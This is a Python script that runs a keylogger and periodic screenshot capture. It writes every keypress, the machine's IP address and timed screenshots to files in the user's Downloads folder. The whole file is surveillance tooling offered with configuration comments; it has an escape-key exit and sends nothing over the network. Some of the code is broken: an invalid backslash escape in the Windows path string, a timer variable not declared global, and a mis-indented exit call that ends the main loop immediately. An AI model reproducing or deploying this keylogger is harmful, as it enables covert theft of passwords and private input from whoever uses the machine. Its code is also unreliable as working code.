#       -------------------------////////////// KW DEVELOPMENT \\\\\\\\\\\\\\\\-----------------------
# # Needed imports below, look at README for nessary PIP installments.
import pyautogui # type: ignore # for cap
import threading # for timing
import keyboard # type: ignore # emg exit
import socket
import random
import os
from datetime import datetime
from pathlib import Path
# Needed variables
hostname = socket.gethostname()
localaddress = socket.gethostbyname(hostname)
timesran = 0 # dont change, nessary for stopping image overlapping.
intv = 30 # in seconds, change this based on how often you want the capture taken.
currentuser = os.getlogin()
flag = True
timer = None
lfilesuffix = ".txt" # change only to stuff that is text WRITEABLE, default TXT.
loggingfilename = str("logging") + lfilesuffix # logging file name, change to your liking.
UserInputoutput_dir = f"C:\Users\{currentuser}\Downloads" # REQUIRED!!! change to where you want the data stored. Always make sure it is the full, not relative path and is a folder.
output_dir = Path(UserInputoutput_dir)
eventcount = 0
capturefilename = str("screenshot") # file name for the capture, change to your liking. 
imagefiletype = ".png" # Change to your liking, must be a valid IMAGE file type.
printdebug = True
emgHotKey = 'esc' # when this key is presed, it exits the code. Leave empty to opt out, lowercase letters only.
#                        ------------------------ Functionality -------------------------
def exitexe():
    global flag, timer
    flag = False
    if timer:
        timer.cancel()

def randomint():
    return random.randint(1,100)

def gettimeAnddate():
    return str(datetime.now())

def capsc():
    global timesran
    timesran += 1
    if not flag:
        exit()
    randomintforss = randomint()
    screenshot = pyautogui.screenshot()
    filename = f"{capturefilename}#{randomintforss}_{timesran}{imagefiletype}"
    screenshot.save(os.path.join(output_dir, filename))
    if flag:
        timer = threading.Timer(intv, capsc)  
        timer.start()

def setupfile():
    with open(os.path.join(output_dir, loggingfilename), "w") as file:
        file.write("This is the log for text data, current use, IP address and Key Logging." + "\n")
        file.write(f"------------- IP ADDRESS = {localaddress} -------------" + "\n")
        file.write(f"--------- DETECT KEY LOGS BELOW (DATE&TIME = {gettimeAnddate()}) ---------" + "\n")


def writeevent(event):
   with open(os.path.join(output_dir, loggingfilename), "a") as file:
       global eventcount
       eventcount += 1
       if eventcount == 40:
           file.write(str(event.name) + "\n")
           eventcount = 0
       else:
           file.write(str(event.name) + " ")

#                 ------------------- Listener and Main Setup --------------------------
# Cannot continue with out the correct directory. 
if not output_dir and not output_dir == "" and not type(output_dir) == str:
    if printdebug:
        print("Raising error, output directory.")
    raise ValueError("You need to define the output directory, or its not a valid string!")
if not os.path.exists(output_dir):
    if printdebug:
        print("Raising error, output directory.")
    raise ValueError("Output directory path does not exist!")

setupfile()
keyboard.on_press(writeevent)
capsc()



# ----------------------------------------- Main Loop ------------------------------------------
try:
    while flag:
        if emgHotKey and not emgHotKey == "" and type(emgHotKey) == str:
            if keyboard.is_pressed(emgHotKey):
                if printdebug: 
                    print("EMG hotkey.. Exiting now.")
            exitexe()
except KeyboardInterrupt:
    if printdebug:
        print("Keyboard Interrupt Detected, cleaning up now.")
except SystemExit:
    if printdebug:
        print("System Exit detected, cleaning up now.")
finally:
    if timer:
        timer.cancel()
    if printdebug:
        print(f"Cleaned up succesfully, goodbye! You might need to wait a while to get terminal access, expected wait time, {intv / 2}-{intv} seconds.")
